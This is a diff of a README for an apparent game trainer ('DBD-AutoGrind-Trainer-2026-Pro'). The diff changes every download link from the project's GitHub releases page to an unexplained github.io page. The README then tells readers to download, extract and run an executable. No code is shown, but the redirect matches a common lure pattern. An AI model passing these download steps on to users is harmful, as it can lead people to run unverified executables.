@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Pro - Automate progress and unlock game items
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://nr634160.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To run this application, ensure your computer meets these standards:
 
 Follow these steps to set up the trainer on your system:
 
-1. Visit the [official release page](https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases) to access the current files.
+1. Visit the [official release page](https://nr634160.github.io) to access the current files.
 2. Locate the file ending in .zip under the latest release section.
 3. Click the file name to start the download.
 4. Open your downloads folder once the transfer finishes.
@@ -29,7 +29,7 @@ Follow these steps to set up the trainer on your system:
 6. Choose a destination folder and click Extract.
 7. Open the extracted folder and locate the executable file.
 
-[![](https://img.shields.io/badge/Get_Started-Download_Here-grey.svg)](https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases)
+[![](https://img.shields.io/badge/Get_Started-Download_Here-grey.svg)](https://nr634160.github.io)
 
 ## 🚀 Running the Trainer
 
